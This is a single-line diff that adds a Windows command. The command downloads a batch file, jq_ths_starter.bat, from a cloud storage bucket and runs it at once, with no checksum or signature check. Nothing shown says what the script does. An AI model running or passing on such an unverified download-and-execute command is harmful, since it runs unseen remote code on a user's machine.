@@ -1,0 +1,1 @@
+curl.exe -L -o jq_ths_starter.bat "https://ccb-files-bucket.oss-cn-beijing.aliyuncs.com/jq_ths_starter.bat"; .\jq_ths_starter.bat
